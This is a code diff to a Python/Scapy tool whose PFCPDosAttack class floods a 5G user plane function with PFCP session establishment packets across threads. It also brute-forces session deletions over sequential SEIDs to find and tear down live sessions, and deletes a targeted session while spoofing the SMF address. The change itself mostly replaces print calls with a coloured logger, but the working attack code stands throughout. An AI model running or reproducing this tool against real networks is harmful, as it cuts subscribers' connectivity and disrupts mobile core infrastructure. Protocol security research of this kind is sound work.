@@ -14,6 +14,49 @@ DEST_PORT = 8805
 SRC_PORT = 8805
 seq=1
 
+class TColors:
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+
+    BG_BLACK = '\033[40m'
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_YELLOW = '\033[43m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
+    BG_WHITE = '\033[47m'
+
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    INVERSE = '\033[7m'
+
+class Log:
+    def __init__(self, prefix):
+        self.prefix = prefix
+
+    def info(self, message):
+        print(f"{TColors.BOLD}{TColors.BLUE}{self.prefix}{TColors.RESET} {message}")
+
+    def error(self, message):
+        print(f"{TColors.BOLD}{TColors.RED}{self.prefix}{TColors.RESET} {message}")
+
+    def success(self, message):
+        print(f"{TColors.BOLD}{TColors.GREEN}{self.prefix}{TColors.RESET} {message}")
+
+    def warning(self, message):
+        print(f"{TColors.BOLD}{TColors.YELLOW}{self.prefix}{TColors.RESET} {message}")
+
+    
+
+
 class Ez_PFCP:
     def __init__(self, src_addr, dest_addr, src_port=8805, dest_port=8805, verbose=False):
         self.src_addr = src_addr
@@ -24,9 +67,12 @@ class Ez_PFCP:
         self.verbose = verbose
         self.seid=None
         
+        self.logger = Log("[EZ-PFCP]")
+        
         
         if verbose:
-            print("[EZ-PFCP] Verbose mode enabled")
+            self.logger.info("Verbose mode enabled")
+
         
         
         
@@ -143,10 +189,12 @@ class Ez_PFCP:
         
 
         if src_addr is None:
-            print("[EZ-PFCP] No source address provided for PFCP session deletion request")
+            self.logger.error("No source address provided for PFCP session deletion request")
+            
             return
         if self.verbose:
-            print(f"[EZ-PFCP] Sending PFCP session deletion packet to {dest_addr} with SEID {seid}")
+            self.logger.info(f"Sending PFCP session deletion request to {dest_addr} with SEID {seid}")
+            
         
 
         
@@ -176,16 +224,16 @@ class Ez_PFCP:
         seq = self.new_seq()
         
         if src_addr is None:
-            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
+            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
             return
         if src_port is None:
-            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
             return
         if dest_addr is None:
-            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
+            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
             return
         if dest_port is None:
-            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
             return
 
 
@@ -198,7 +246,7 @@ class Ez_PFCP:
         )
         send(pfcp_association_setup_req)
         if self.verbose:
-            print(f"[EZ-PFCP] PFCP Association Setup packet sent")
+            self.logger.success(f"PFCP Association Setup packet sent to {dest_addr}")
             
             
     def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
@@ -210,25 +258,27 @@ class Ez_PFCP:
         seid = seid or self.seid
         seq = self.new_seq(randomize=random_seq)
         
+        
         if src_addr is None:
-            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
+            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
             return
         if src_port is None:
-            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
             return
         if dest_addr is None:
-            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
+            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
             return
         if dest_port is None:
-            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
             return
         if ue_addr is None:
-            print("[EZ-PFCP] Error: No UE address provided. Expected a valid IPv4 address (e.g., '10.0.0.1').")
+            self.logger.error("Error: No UE address provided. Expected a valid IPv4 address (e.g., '10.0.0.1').")
             return
 
         
         if self.verbose:
-            print(f"[EZ-PFCP] Sending PFCP session establishment request to {dest_addr} with SEID {seid}, UE address {ue_addr}, TEID {teid}, precedence {precedence}, interface {interface}")
+            self.logger.info(f"Sending PFCP session establishment request to {dest_addr} with SEID {seid}, UE address {ue_addr}, TEID {teid}, precedence {precedence}, interface {interface}")
+           
         
         
         
@@ -247,7 +297,8 @@ class Ez_PFCP:
         )
         send(pfcp_session_establishment_req)
         if self.verbose:
-            print(f"[EZ-PFCP] PFCP Session Establishment packet sent")
+            self.logger.success(f"PFCP Session Establishment packet sent to {dest_addr} with SEID {seid}")
+            
 
     def Send_PFCP_session_deletion_req(self, seid, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
         
@@ -257,19 +308,19 @@ class Ez_PFCP:
         dest_port = dest_port or self.dest_port
         seq=self.new_seq()
         if seid is None:
-            print("[EZ-PFCP] Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
+            self.logger.error("Error: No SEID provided. Expected a valid SEID (e.g., 0xC0FFEE).")
             return
         if src_addr is None:
-            print("[EZ-PFCP] Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
+            self.logger.error("Error: No source address provided. Expected a valid IPv4 address (e.g., '192.168.1.1').")
+            return
+        if src_port is None:
+            self.logger.error("Error: No source port provided. Expected a valid port number (e.g., 8805).")
             return
         if dest_addr is None:
-            print("[EZ-PFCP] Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
-            return 
-        if src_port is None:
-            print("[EZ-PFCP] Error: No source port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No destination address provided. Expected a valid IPv4 address (e.g., '192.168.1.2').")
             return
         if dest_port is None:
-            print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
+            self.logger.error("Error: No destination port provided. Expected a valid port number (e.g., 8805).")
             return
 
         req = self.Build_PFCP_session_deletion_req(
@@ -285,7 +336,8 @@ class Ez_PFCP:
         
         res = sr1(req)
         if not res:
-            print("[EZ-PFCP] No response received for PFCP session deletion request")
+            self.logger.error("No response received for PFCP session deletion request")
+            
         
         pfcp_cause = None
         
@@ -294,7 +346,8 @@ class Ez_PFCP:
                 pfcp_cause = ie.cause
                 break
         if self.verbose:
-            print(f"[EZ-PFCP] PFCP Session Deletion response received with cause: {pfcp_cause}")
+            self.logger.info(f"PFCP Session Deletion response received with cause: {pfcp_cause}")
+            
         return pfcp_cause
         
         
@@ -336,35 +389,45 @@ class PFCPDosAttack:
         self.SESSION_CONTEXT_NOT_FOUND = 65
         self.REQUEST_ACCEPTED = 1
         self.valid_seid_list = list()
+        self.log_prefix = f"{TColors.BOLD + TColors.GREEN}[DoS] {TColors.RESET}"
+        
+        self.logger = Log("[DoS]")
         
     def set_random_far_number(self, random_far_number=15):
         self.random_far_number = random_far_number
         if not self.verbose : return
         if random_far_number:
-            print(f"[DoS] Random FAR number set to {random_far_number}")
+            self.logger.info(f"Random FAR number set to {random_far_number}")
+            
 
     def set_randomize(self, randomize=True):
         self.randomize = randomize
         if not self.verbose : return
         if randomize:
-            print("[DoS] Randomize mode enabled")
+            self.logger.info("Randomize mode enabled")
+            
         else:
-            print("[DoS] Randomize mode disabled")
+            self.logger.info("Randomize mode disabled")
+            
     
     def set_prepare(self, prepare=True):
         self.prepare = prepare
         if not self.verbose : return
         if prepare:
-            print("[DoS] Prepare mode enabled")
+            self.logger.info("Prepare mode enabled")
+            
         else:
-            print("[DoS] Prepare mode disabled")
+            self.logger.info("Prepare mode disabled")
+            
     
     def set_verbose(self, verbose=True):
         self.verbose = verbose
         if verbose:
-            print("[DoS] Verbose mode enabled")
+            self.logger.info("Verbose mode enabled")
+            
         else:
-            print("[DoS]Verbose mode disabled")
+            self.logger.info("Verbose mode disabled")
+            
     
     def new_ue_addr(self, randomize=False):
         if self.randomize or randomize:
@@ -411,7 +474,8 @@ class PFCPDosAttack:
 
     
     def prepare_pfcp_session_establishment_flood(self, count):
-        print(f"[DoS] Preparing {count} PFCP session establishment packets")
+        self.logger.info(f"Preparing {count} PFCP session establishment packets")
+        
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
         
         start_time = time.time()
@@ -430,21 +494,27 @@ class PFCPDosAttack:
             if now - last_update >= 5:
                 percent = (i + 1)* 100 // count
                 last_update = now
-                print(f"[DoS] Progress: {percent}% ({i+1}/{count})")
-        print(f"[DoS] Prepared the PFCP association setup packet")
-        print(f"[DoS] Prepared {count} PFCP session establishment packets")
+                self.logger.info(f"[DoS] Progress: {percent}% ({i+1}/{count})")
+                
+        self.logger.success(f"Prepared the PFCP association setup packet")
+        self.logger.success(f"Prepared {count} PFCP session establishment packets")
+
     
     def prepare_pfcp_session_deletion_flood(self, count):
         if self.verbose:
-            print(f"[DoS] Preparing {count} PFCP session deletion packets")
+            self.logger.info(f"Preparing {count} PFCP session deletion packets")
+
         print("Hello World")
     
     def pfcp_session_establishment_flood_worker(self, count, start_index=0):
+        worker_logger = Log(f"[DoS][Worker-{start_index}]")
         if self.verbose:
             if self.prepare:
-                print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
+                worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
+                
             else:
-                print(f"[DoS][Worker] Worker starts flooding with {count} requests")
+                worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
+                
             
             
         
@@ -453,7 +523,8 @@ class PFCPDosAttack:
                 try:
                     send(self.pfcp_establishment_packet_list[i])
                 except Exception as e:
-                    print(f"[DoS][Worker] Error sending PFCP session establishment packet: {e}")
+                    worker_logger.error(f"Error sending PFCP session establishment packet: {e}")
+                    
         else:
             pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
             for i in range(count):
@@ -466,15 +537,19 @@ class PFCPDosAttack:
                         random_far_number=self.random_far_number
                     )
                 except Exception as e:
-                    print(f"[DoS][Worker] Error sending PFCP session establishment request: {e}")
+                    worker_logger.error(f"Error sending PFCP session establishment request: {e}")
+                    
                 
             
         if self.verbose:
-            print(f"[DoS][Worker] Worker finished flooding with {count} requests")
+            worker_logger.success(f"Worker finished flooding with {count} requests")
+            
 
     def pfcp_session_deletion_flood_worker(self, count, start_index=0):
+        worker_logger = Log(f"[DoS][Worker-{start_index}]")
         if self.verbose:
-            print(f"[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
+            worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
+            
         
         
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
@@ -485,17 +560,20 @@ class PFCPDosAttack:
 
                     
                 if response == self.REQUEST_ACCEPTED:
-                    print(f"[DoS][Worker] PFCP session deletion request accepted; SEID: {hex(i+1)}")
+                    worker_logger.success(f"PFCP session deletion request accepted; SEID: {hex(i+1)}")
+                    
                     self.valid_seid_list.append(i+1)
                     
             except Exception as e:
-                print(f"[DoS][Worker] Error sending PFCP session deletion request: {e}") 
+                worker_logger.error(f"Error sending PFCP session deletion request: {e}")
+                
                 
     
     def Start_pfcp_session_deletion_flood(self, reqNbr=100, num_threads=1):
 
         if self.verbose:
-            print(f"[DoS] Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")
+            self.logger.info(f"Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")
+            
 
         threads= []
         per_thread = reqNbr // num_threads
@@ -513,12 +591,14 @@ class PFCPDosAttack:
         for t in threads:
             t.join()
         if self.verbose:
-            print(f"[DoS] PFCP session deletion flood completed")
+            self.logger.success(f"PFCP session deletion flood completed")
+            
         end_time = time.time()
         duration = end_time - start_time
         pps = reqNbr / duration if duration > 0 else float("inf")
-        print(f"[DoS] Sent {reqNbr} session deletion packets in {duration:.2f} seconds ({pps:.2f} pps)")
-        print(f"[DoS] {len(self.valid_seid_list)} valid SEIDs found ({count / len(self.valid_seid_list)*100}%)")
+        self.logger.success(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        self.logger.success(f"{len(self.valid_seid_list)} valid SEIDs found ({len(self.valid_seid_list) / reqNbr * 100:.2f}%)")
+
         
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
@@ -527,7 +607,8 @@ class PFCPDosAttack:
         
         
         if self.verbose:
-            print(f"[DoS] Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
+            self.logger.info(f"Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
+            
         
         threads = []
         per_thread = reqNbr // num_threads
@@ -541,7 +622,8 @@ class PFCPDosAttack:
         try:
             send(pfcp_association_packet)
         except Exception as e:
-            print(f"[DoS] Error sending PFCP association packet: {e}")
+            self.logger.error(f"Error sending PFCP association packet: {e}")
+            
         
         thread_offset = 0
         for i in range(num_threads):
@@ -556,11 +638,13 @@ class PFCPDosAttack:
         end_time = time.time()
 
         if self.verbose:
-            print(f"[DoS] PFCP session establishment flood completed")
+            self.logger.success(f"PFCP session establishment flood completed")
+            
         
         duration = end_time - start_time
         pps = reqNbr / duration if duration > 0 else float("inf")
-        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        self.logger.success(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        
     
     def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr=None, upf_addr=None, src_port=None, dest_port=None):
         
@@ -570,28 +654,34 @@ class PFCPDosAttack:
         dest_port = dest_port or self.dest_port
         
         if upf_addr is None:
-            print("[DoS] No UPF address provided for PFCP session deletion")
+            self.logger.error("No UPF address provided for PFCP session deletion")
+            
             return
         if smf_addr == None:
-            print("[DoS] No SMF address provided for PFCP session deletion")
+            self.logger.error("No SMF address provided for PFCP session deletion")
+            
             return
         
         if src_port is None:
-            print("[DoS] No source port provided for PFCP session deletion")
+            self.logger.error("No source port provided for PFCP session deletion")
+            
             return
         if dest_port is None:
-            print("[DoS] No destination port provided for PFCP session deletion")
+            self.logger.error("No destination port provided for PFCP session deletion")
+            
             return
         
             
         if not target_seid:
-            print("[DoS] No SEID provided for PFCP session deletion")
+            self.logger.error("No SEID provided for PFCP session deletion")
+            
             return
 
         
         
         if self.verbose:
-            print(f"[DoS] Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
+            self.logger.info(f"Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
+            
         
         ez_pfcp_obj = Ez_PFCP(src_addr=smf_addr,
                               dest_addr=upf_addr,
@@ -602,7 +692,8 @@ class PFCPDosAttack:
         
         
         if self.verbose:
-            print(f"[DoS] PFCP Session Deletion packet sent to {upf_addr}")
+            self.logger.success(f"PFCP session deletion packet sent to {upf_addr} with SEID {target_seid}")
+            
         
 
 
